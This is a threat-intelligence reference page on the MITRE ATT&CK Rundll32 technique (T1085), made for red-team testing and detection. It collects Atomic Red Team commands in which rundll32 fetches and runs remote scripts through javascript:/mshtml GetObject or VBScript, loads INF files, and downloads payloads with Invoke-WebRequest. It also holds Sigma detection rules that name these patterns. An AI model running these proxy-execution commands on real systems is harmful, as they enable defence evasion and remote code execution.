
# Rundll32

## Description

### MITRE Description

> The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.

Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)

## Additional Attributes

* Bypass: ['Anti-virus', 'Application whitelisting', 'Digital Certificate Validation']
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1085

## Potential Commands

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct").Exec();

rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)

rundll32.exe advpack.dll,LaunchINFSection PathToAtomicsFolder\T1085\src\T1085.inf,DefaultInstall_SingleUser,1,

rundll32.exe ieadvpack.dll,LaunchINFSection PathToAtomicsFolder\T1085\src\T1085.inf,DefaultInstall_SingleUser,1,

rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf

rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf

\\Windows\\.+\\rundll32.exevbscript|javascript|http|https|.dll
```

## Commands Dataset

```
[{'command': 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication '
             '";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct").Exec();\n',
  'name': None,
  'source': 'atomics/T1085/T1085.yaml'},
 {'command': 'rundll32 vbscript:"\\..\\mshtml,RunHTMLApplication '
             '"+String(CreateObject("WScript.Shell").Run("calc.exe"),0)\n',
  'name': None,
  'source': 'atomics/T1085/T1085.yaml'},
 {'command': 'rundll32.exe advpack.dll,LaunchINFSection '
             'PathToAtomicsFolder\\T1085\\src\\T1085.inf,DefaultInstall_SingleUser,1,\n',
  'name': None,
  'source': 'atomics/T1085/T1085.yaml'},
 {'command': 'rundll32.exe ieadvpack.dll,LaunchINFSection '
             'PathToAtomicsFolder\\T1085\\src\\T1085.inf,DefaultInstall_SingleUser,1,\n',
  'name': None,
  'source': 'atomics/T1085/T1085.yaml'},
 {'command': 'rundll32.exe syssetup.dll,SetupInfObjectInstallAction '
             'DefaultInstall 128 '
             '.\\PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf\n',
  'name': None,
  'source': 'atomics/T1085/T1085.yaml'},
 {'command': 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 '
             '.\\PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf\n',
  'name': None,
  'source': 'atomics/T1085/T1085.yaml'},
 {'command': '\\\\Windows\\\\.+\\\\rundll32.exevbscript|javascript|http|https|.dll',
  'name': None,
  'source': 'SysmonHunter - Rundll32'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Florian Roth',
                  'description': 'Detects a specific tool and export used by '
                                 'EquationGroup',
                  'detection': {'condition': '1 of them',
                                'selection1': {'CommandLine': '*,dll_u',
                                               'Image': '*\\rundll32.exe'},
                                'selection2': {'CommandLine': '* -export dll_u '
                                                              '*'}},
                  'falsepositives': ['Unknown'],
                  'id': 'd465d1d8-27a2-4cca-9621-a800f37cf72e',
                  'level': 'critical',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://github.com/adamcaudill/EquationGroupLeak/search?utf8=%E2%9C%93&q=dll_u&type=',
                                 'https://securelist.com/apt-slingshot/84312/',
                                 'https://twitter.com/cyb3rops/status/972186477512839170'],
                  'tags': ['attack.execution',
                           'attack.g0020',
                           'attack.t1059',
                           'attack.defense_evasion',
                           'attack.t1085'],
                  'title': 'Equation Group DLL_U Load'}},
 {'data_source': {'author': 'Florian Roth',
                  'description': 'Detects Trojan loader acitivty as used by '
                                 'APT28',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['rundll32.exe '
                                                              '%APPDATA%\\\\*.dat",*',
                                                              'rundll32.exe '
                                                              '%APPDATA%\\\\*.dll",#1']}},
                  'falsepositives': ['Unknown'],
                  'id': 'ba778144-5e3d-40cf-8af9-e28fb1df1e20',
                  'level': 'critical',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://researchcenter.paloaltonetworks.com/2018/02/unit42-sofacy-attacks-multiple-government-entities/',
                                 'https://www.reverse.it/sample/e3399d4802f9e6d6d539e3ae57e7ea9a54610a7c4155a6541df8e94d67af086e?environmentId=100',
                                 'https://twitter.com/ClearskySec/status/960924755355369472'],
                  'status': 'experimental',
                  'tags': ['attack.g0007',
                           'attack.execution',
                           'attack.t1059',
                           'attack.defense_evasion',
                           'attack.t1085',
                           'car.2013-10-002'],
                  'title': 'Sofacy Trojan Loader Activity'}},
 {'data_source': {'author': '@41thexplorer, Windows Defender ATP',
                  'description': 'Detects TropicTrooper activity, an actor who '
                                 'targeted high-profile organizations in the '
                                 'energy and food and beverage sectors in Asia',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': '*abCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCc*'}},
                  'id': '8c7090c3-e0a0-4944-bd08-08c3a0cecf79',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://cloudblogs.microsoft.com/microsoftsecure/2018/11/28/windows-defender-atp-device-risk-score-exposes-new-cyberattack-drives-conditional-access-to-protect-networks/'],
                  'status': 'stable',
                  'tags': ['attack.execution', 'attack.t1085'],
                  'title': 'TropicTrooper Campaign November 2018'}},
 {'data_source': {'action': 'global',
                  'author': '@41thexplorer, Windows Defender ATP',
                  'date': '2018/11/20',
                  'description': 'A sigma rule detecting an unidetefied '
                                 'attacker who used phishing emails to target '
                                 'high profile orgs on November 2018. The '
                                 'Actor shares some TTPs with YYTRIUM/APT29 '
                                 'campaign in 2016.',
                  'detection': {'condition': '1 of them'},
                  'id': '7453575c-a747-40b9-839b-125a0aae324b',
                  'level': 'high',
                  'modified': '2018/12/11',
                  'references': ['https://twitter.com/DrunkBinary/status/1063075530180886529'],
                  'status': 'stable',
                  'tags': ['attack.execution', 'attack.t1085'],
                  'title': 'Unidentified Attacker November 2018'}},
 {'data_source': {'detection': {'selection1': {'CommandLine': '*cyzfc.dat, '
                                                              'PointFunctionCall'}},
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'}}},
 {'data_source': {'detection': {'selection2': {'EventID': 11,
                                               'TargetFilename': ['*ds7002.lnk*']}},
                  'logsource': {'product': 'windows', 'service': 'sysmon'}}},
 {'data_source': {'author': 'Florian Roth',
                  'description': 'Detects a ZxShell start by the called and '
                                 'well-known function name',
                  'detection': {'condition': 'selection',
                                'selection': {'Command': ['rundll32.exe '
                                                          '*,zxFunction*',
                                                          'rundll32.exe '
                                                          '*,RemoteDiskXXXXX']}},
                  'falsepositives': ['Unlikely'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': 'f0b70adb-0075-43b0-9745-e82a1c608fcc',
                  'level': 'critical',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.hybrid-analysis.com/sample/5d2a4cde9fa7c2fdbf39b2e2ffd23378d0c50701a3095d1e91e3cf922d7b0b16?environmentId=100'],
                  'tags': ['attack.g0001',
                           'attack.execution',
                           'attack.t1059',
                           'attack.defense_evasion',
                           'attack.t1085'],
                  'title': 'ZxShell Malware'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2017/06/03',
                  'description': 'Detects Archer malware invocation via '
                                 'rundll32',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': '*\\rundll32.exe '
                                                             '*,InstallArcherSvc'}},
                  'falsepositives': ['Unknown'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': '3d4aebe0-6d29-45b2-a8a4-3dfde586a26d',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.virustotal.com/en/file/9b4971349ae85aa09c0a69852ed3e626c954954a3927b3d1b6646f139b930022/analysis/',
                                 'https://www.hybrid-analysis.com/sample/9b4971349ae85aa09c0a69852ed3e626c954954a3927b3d1b6646f139b930022?environmentId=100'],
                  'status': 'experimental',
                  'tags': ['attack.execution',
                           'attack.t1059',
                           'attack.defense_evasion',
                           'attack.t1085'],
                  'title': 'Fireball Archer Install'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2017/11/04',
                  'description': 'Detects a rundll32 that communicates with '
                                 'public IP addresses',
                  'detection': {'condition': 'selection and not filter',
                                'filter': {'DestinationIp': ['10.*',
                                                             '192.168.*',
                                                             '172.16.*',
                                                             '172.17.*',
                                                             '172.18.*',
                                                             '172.19.*',
                                                             '172.20.*',
                                                             '172.21.*',
                                                             '172.22.*',
                                                             '172.23.*',
                                                             '172.24.*',
                                                             '172.25.*',
                                                             '172.26.*',
                                                             '172.27.*',
                                                             '172.28.*',
                                                             '172.29.*',
                                                             '172.30.*',
                                                             '172.31.*',
                                                             '127.*']},
                                'selection': {'EventID': 3,
                                              'Image': '*\\rundll32.exe',
                                              'Initiated': 'true'}},
                  'falsepositives': ['Communication to other corporate systems '
                                     'that use IP addresses from public '
                                     'address spaces'],
                  'id': 'cdc8da7d-c303-42f8-b08c-b4ab47230263',
                  'level': 'medium',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://www.hybrid-analysis.com/sample/759fb4c0091a78c5ee035715afe3084686a8493f39014aea72dae36869de9ff6?environmentId=100'],
                  'status': 'experimental',
                  'tags': ['attack.t1085',
                           'attack.defense_evasion',
                           'attack.execution'],
                  'title': 'Rundll32 Internet Connection'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2017/04/15',
                  'description': 'Detects suspicious Rundll32 execution from '
                                 'control.exe as used by Equation Group and '
                                 'Exploit Kits',
                  'detection': {'condition': 'selection and not filter',
                                'filter': {'CommandLine': '*Shell32.dll*'},
                                'selection': {'CommandLine': '*\\rundll32.exe '
                                                             '*',
                                              'ParentImage': '*\\System32\\control.exe'}},
                  'falsepositives': ['Unknown'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': 'd7eb979b-c2b5-4a6f-a3a7-c87ce6763819',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://twitter.com/rikvduijn/status/853251879320662017'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.t1073',
                           'attack.t1085',
                           'car.2013-10-002'],
                  'title': 'Suspicious Control Panel DLL Load'}},
 {'data_source': {'author': 'juju4',
                  'description': 'Detects suspicious process related to '
                                 'rundll32 based on arguments',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['*\\rundll32.exe* '
                                                              'url.dll,*OpenURL '
                                                              '*',
                                                              '*\\rundll32.exe* '
                                                              'url.dll,*OpenURLA '
                                                              '*',
                                                              '*\\rundll32.exe* '
                                                              'url.dll,*FileProtocolHandler '
                                                              '*',
                                                              '*\\rundll32.exe* '
                                                              'zipfldr.dll,*RouteTheCall '
                                                              '*',
                                                              '*\\rundll32.exe* '
                                                              'Shell32.dll,*Control_RunDLL '
                                                              '*',
                                                              '*\\rundll32.exe '
                                                              'javascript:*',
                                                              '* '
                                                              'url.dll,*OpenURL '
                                                              '*',
                                                              '* '
                                                              'url.dll,*OpenURLA '
                                                              '*',
                                                              '* '
                                                              'url.dll,*FileProtocolHandler '
                                                              '*',
                                                              '* '
                                                              'zipfldr.dll,*RouteTheCall '
                                                              '*',
                                                              '* '
                                                              'Shell32.dll,*Control_RunDLL '
                                                              '*',
                                                              '* javascript:*',
                                                              '*.RegisterXLL*']}},
                  'falsepositives': ['False positives depend on scripts and '
                                     'administrative tools used in the '
                                     'monitored environment'],
                  'id': 'e593cf51-88db-4ee1-b920-37e89012a3c9',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/',
                                 'https://twitter.com/Hexacorn/status/885258886428725250',
                                 'https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.execution',
                           'attack.t1085'],
                  'title': 'Suspicious Rundll32 Activity'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2019/10/22',
                  'description': 'Detects suspicious calls of DLLs in '
                                 'rundll32.dll exports by ordinal',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': '*\\rundll32.exe '
                                                             '*,#*'}},
                  'falsepositives': ['False positives depend on scripts and '
                                     'administrative tools used in the '
                                     'monitored environment',
                                     'Windows contol panel elements have been '
                                     'identified as source (mmc)'],
                  'id': 'e79a9e79-eb72-4e78-a628-0e7e8f59e89c',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://techtalk.pcmatic.com/2017/11/30/running-dll-files-malware-analysis/',
                                 'https://github.com/Neo23x0/DLLRunner',
                                 'https://twitter.com/cyb3rops/status/1186631731543236608'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.execution',
                           'attack.t1085'],
                  'title': 'Suspicious Call by Ordinal'}}]
```

## Potential Queries

```json
[{'name': 'Rundll32',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and (process_parent_path contains '
           '"\\\\rundll32.exe"or process_path contains "rundll32.exe")'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Rundll32': {'atomic_tests': [{'description': 'Test '
                                                                       'execution '
                                                                       'of a '
                                                                       'remote '
                                                                       'script '
                                                                       'using '
                                                                       'rundll32.exe. '
                                                                       'Upon '
                                                                       'execution '
                                                                       'notepad.exe '
                                                                       'will '
                                                                       'be '
                                                                       'opened.\n',
                                                        'executor': {'command': 'rundll32.exe '
                                                                                'javascript:"\\..\\mshtml,RunHTMLApplication '
                                                                                '";document.write();GetObject("script:#{file_url}").Exec();\n',
                                                                     'elevation_required': False,
                                                                     'name': 'command_prompt'},
                                                        'input_arguments': {'file_url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct',
                                                                                         'description': 'location '
                                                                                                        'of '
                                                                                                        'the '
                                                                                                        'payload',
                                                                                         'type': 'Url'}},
                                                        'name': 'Rundll32 '
                                                                'execute '
                                                                'JavaScript '
                                                                'Remote '
                                                                'Payload With '
                                                                'GetObject',
                                                        'supported_platforms': ['windows']},
                                                       {'description': 'Test '
                                                                       'execution '
                                                                       'of a '
                                                                       'command '
                                                                       'using '
                                                                       'rundll32.exe '
                                                                       'and '
                                                                       'VBscript '
                                                                       'in a '
                                                                       'similar '
                                                                       'manner '
                                                                       'to the '
                                                                       'JavaScript '
                                                                       'test.\n'
                                                                       'Technique '
                                                                       'documented '
                                                                       'by '
                                                                       'Hexacorn- '
                                                                       'http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\n'
                                                                       'Upon '
                                                                       'execution '
                                                                       'calc.exe '
                                                                       'will '
                                                                       'be '
                                                                       'launched\n',
                                                        'executor': {'command': 'rundll32 '
                                                                                'vbscript:"\\..\\mshtml,RunHTMLApplication '
                                                                                '"+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)\n',
                                                                     'elevation_required': False,
                                                                     'name': 'command_prompt'},
                                                        'input_arguments': {'command_to_execute': {'default': 'calc.exe',
                                                                                                   'description': 'Command '
                                                                                                                  'for '
                                                                                                                  'rundll32.exe '
                                                                                                                  'to '
                                                                                                                  'execute',
                                                                                                   'type': 'string'}},
                                                        'name': 'Rundll32 '
                                                                'execute '
                                                                'VBscript '
                                                                'command',
                                                        'supported_platforms': ['windows']},
                                                       {'dependencies': [{'description': 'Inf '
                                                                                         'file '
                                                                                         'must '
                                                                                         'exist '
                                                                                         'on '
                                                                                         'disk '
                                                                                         'at '
                                                                                         'specified '
                                                                                         'location '
                                                                                         '(#{inf_to_execute})\n',
                                                                          'get_prereq_command': 'New-Item '
                                                                                                '-Type '
                                                                                                'Directory '
                                                                                                '(split-path '
                                                                                                '#{inf_to_execute}) '
                                                                                                '-ErrorAction '
                                                                                                'ignore '
                                                                                                '| '
                                                                                                'Out-Null\n'
                                                                                                'Invoke-WebRequest '
                                                                                                '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085.inf" '
                                                                                                '-OutFile '
                                                                                                '"#{inf_to_execute}"\n',
                                                                          'prereq_command': 'if '
                                                                                            '(Test-Path '
                                                                                            '#{inf_to_execute}) '
                                                                                            '{exit '
                                                                                            '0} '
                                                                                            'else '
                                                                                            '{exit '
                                                                                            '1}\n'}],
                                                        'dependency_executor_name': 'powershell',
                                                        'description': 'Test '
                                                                       'execution '
                                                                       'of a '
                                                                       'command '
                                                                       'using '
                                                                       'rundll32.exe '
                                                                       'with '
                                                                       'advpack.dll.\n'
                                                                       'Reference: '
                                                                       'https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\n'
                                                                       'Upon '
                                                                       'execution '
                                                                       'calc.exe '
                                                                       'will '
                                                                       'be '
                                                                       'launched\n',
                                                        'executor': {'command': 'rundll32.exe '
                                                                                'advpack.dll,LaunchINFSection '
                                                                                '#{inf_to_execute},DefaultInstall_SingleUser,1,\n',
                                                                     'elevation_required': False,
                                                                     'name': 'command_prompt'},
                                                        'input_arguments': {'inf_to_execute': {'default': 'PathToAtomicsFolder\\T1085\\src\\T1085.inf',
                                                                                               'description': 'Local '
                                                                                                              'location '
                                                                                                              'of '
                                                                                                              'inf '
                                                                                                              'file',
                                                                                               'type': 'string'}},
                                                        'name': 'Rundll32 '
                                                                'advpack.dll '
                                                                'Execution',
                                                        'supported_platforms': ['windows']},
                                                       {'dependencies': [{'description': 'Inf '
                                                                                         'file '
                                                                                         'must '
                                                                                         'exist '
                                                                                         'on '
                                                                                         'disk '
                                                                                         'at '
                                                                                         'specified '
                                                                                         'location '
                                                                                         '(#{inf_to_execute})\n',
                                                                          'get_prereq_command': 'New-Item '
                                                                                                '-Type '
                                                                                                'Directory '
                                                                                                '(split-path '
                                                                                                '#{inf_to_execute}) '
                                                                                                '-ErrorAction '
                                                                                                'ignore '
                                                                                                '| '
                                                                                                'Out-Null\n'
                                                                                                'Invoke-WebRequest '
                                                                                                '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085.inf" '
                                                                                                '-OutFile '
                                                                                                '"#{inf_to_execute}"\n',
                                                                          'prereq_command': 'if '
                                                                                            '(Test-Path '
                                                                                            '#{inf_to_execute}) '
                                                                                            '{exit '
                                                                                            '0} '
                                                                                            'else '
                                                                                            '{exit '
                                                                                            '1}\n'}],
                                                        'dependency_executor_name': 'powershell',
                                                        'description': 'Test '
                                                                       'execution '
                                                                       'of a '
                                                                       'command '
                                                                       'using '
                                                                       'rundll32.exe '
                                                                       'with '
                                                                       'ieadvpack.dll.\n'
                                                                       'Upon '
                                                                       'execution '
                                                                       'calc.exe '
                                                                       'will '
                                                                       'be '
                                                                       'launched\n'
                                                                       '\n'
                                                                       'Reference: '
                                                                       'https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n',
                                                        'executor': {'command': 'rundll32.exe '
                                                                                'ieadvpack.dll,LaunchINFSection '
                                                                                '#{inf_to_execute},DefaultInstall_SingleUser,1,\n',
                                                                     'elevation_required': False,
                                                                     'name': 'command_prompt'},
                                                        'input_arguments': {'inf_to_execute': {'default': 'PathToAtomicsFolder\\T1085\\src\\T1085.inf',
                                                                                               'description': 'Local '
                                                                                                              'location '
                                                                                                              'of '
                                                                                                              'inf '
                                                                                                              'file',
                                                                                               'type': 'string'}},
                                                        'name': 'Rundll32 '
                                                                'ieadvpack.dll '
                                                                'Execution',
                                                        'supported_platforms': ['windows']},
                                                       {'dependencies': [{'description': 'Inf '
                                                                                         'file '
                                                                                         'must '
                                                                                         'exist '
                                                                                         'on '
                                                                                         'disk '
                                                                                         'at '
                                                                                         'specified '
                                                                                         'location '
                                                                                         '(#{inf_to_execute})\n',
                                                                          'get_prereq_command': 'New-Item '
                                                                                                '-Type '
                                                                                                'Directory '
                                                                                                '(split-path '
                                                                                                '#{inf_to_execute}) '
                                                                                                '-ErrorAction '
                                                                                                'ignore '
                                                                                                '| '
                                                                                                'Out-Null\n'
                                                                                                'Invoke-WebRequest '
                                                                                                '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085_DefaultInstall.inf" '
                                                                                                '-OutFile '
                                                                                                '"#{inf_to_execute}"\n',
                                                                          'prereq_command': 'if '
                                                                                            '(Test-Path '
                                                                                            '#{inf_to_execute}) '
                                                                                            '{exit '
                                                                                            '0} '
                                                                                            'else '
                                                                                            '{exit '
                                                                                            '1}\n'}],
                                                        'dependency_executor_name': 'powershell',
                                                        'description': 'Test '
                                                                       'execution '
                                                                       'of a '
                                                                       'command '
                                                                       'using '
                                                                       'rundll32.exe '
                                                                       'with '
                                                                       'syssetup.dll. '
                                                                       'Upon '
                                                                       'execution, '
                                                                       'a '
                                                                       'window '
                                                                       'saying '
                                                                       '"installation '
                                                                       'failed" '
                                                                       'will '
                                                                       'be '
                                                                       'opened\n'
                                                                       '\n'
                                                                       'Reference: '
                                                                       'https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n',
                                                        'executor': {'command': 'rundll32.exe '
                                                                                'syssetup.dll,SetupInfObjectInstallAction '
                                                                                'DefaultInstall '
                                                                                '128 '
                                                                                '.\\#{inf_to_execute}\n',
                                                                     'elevation_required': False,
                                                                     'name': 'command_prompt'},
                                                        'input_arguments': {'inf_to_execute': {'default': 'PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf',
                                                                                               'description': 'Local '
                                                                                                              'location '
                                                                                                              'of '
                                                                                                              'inf '
                                                                                                              'file',
                                                                                               'type': 'string'}},
                                                        'name': 'Rundll32 '
                                                                'syssetup.dll '
                                                                'Execution',
                                                        'supported_platforms': ['windows']},
                                                       {'dependencies': [{'description': 'Inf '
                                                                                         'file '
                                                                                         'must '
                                                                                         'exist '
                                                                                         'on '
                                                                                         'disk '
                                                                                         'at '
                                                                                         'specified '
                                                                                         'location '
                                                                                         '(#{inf_to_execute})\n',
                                                                          'get_prereq_command': 'New-Item '
                                                                                                '-Type '
                                                                                                'Directory '
                                                                                                '(split-path '
                                                                                                '#{inf_to_execute}) '
                                                                                                '-ErrorAction '
                                                                                                'ignore '
                                                                                                '| '
                                                                                                'Out-Null\n'
                                                                                                'Invoke-WebRequest '
                                                                                                '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085_DefaultInstall.inf" '
                                                                                                '-OutFile '
                                                                                                '"#{inf_to_execute}"\n',
                                                                          'prereq_command': 'if '
                                                                                            '(Test-Path '
                                                                                            '#{inf_to_execute}) '
                                                                                            '{exit '
                                                                                            '0} '
                                                                                            'else '
                                                                                            '{exit '
                                                                                            '1}\n'}],
                                                        'dependency_executor_name': 'powershell',
                                                        'description': 'Test '
                                                                       'execution '
                                                                       'of a '
                                                                       'command '
                                                                       'using '
                                                                       'rundll32.exe '
                                                                       'with '
                                                                       'setupapi.dll. '
                                                                       'Upon '
                                                                       'execution, '
                                                                       'a '
                                                                       'windows '
                                                                       'saying '
                                                                       '"installation '
                                                                       'failed" '
                                                                       'will '
                                                                       'be '
                                                                       'opened\n'
                                                                       '\n'
                                                                       'Reference: '
                                                                       'https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n',
                                                        'executor': {'command': 'rundll32.exe '
                                                                                'setupapi.dll,InstallHinfSection '
                                                                                'DefaultInstall '
                                                                                '128 '
                                                                                '.\\#{inf_to_execute}\n',
                                                                     'elevation_required': False,
                                                                     'name': 'command_prompt'},
                                                        'input_arguments': {'inf_to_execute': {'default': 'PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf',
                                                                                               'description': 'Local '
                                                                                                              'location '
                                                                                                              'of '
                                                                                                              'inf '
                                                                                                              'file',
                                                                                               'type': 'string'}},
                                                        'name': 'Rundll32 '
                                                                'setupapi.dll '
                                                                'Execution',
                                                        'supported_platforms': ['windows']}],
                                      'attack_technique': 'T1085',
                                      'display_name': 'Rundll32'}},
 {'SysmonHunter - T1085': {'description': None,
                           'level': 'medium',
                           'name': 'Rundll32',
                           'phase': 'Execution',
                           'query': [{'process': {'cmdline': {'pattern': 'vbscript|javascript|http|https|.dll'},
                                                  'image': {'flag': 'regex',
                                                            'pattern': '\\\\Windows\\\\.+\\\\rundll32.exe'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Execution](../tactics/Execution.md)
    

# Mitigations

None

# Actors


* [CopyKittens](../actors/CopyKittens.md)

* [APT19](../actors/APT19.md)
    
* [APT28](../actors/APT28.md)
    
* [APT3](../actors/APT3.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Carbanak](../actors/Carbanak.md)
    
* [APT29](../actors/APT29.md)
    
* [TA505](../actors/TA505.md)
    
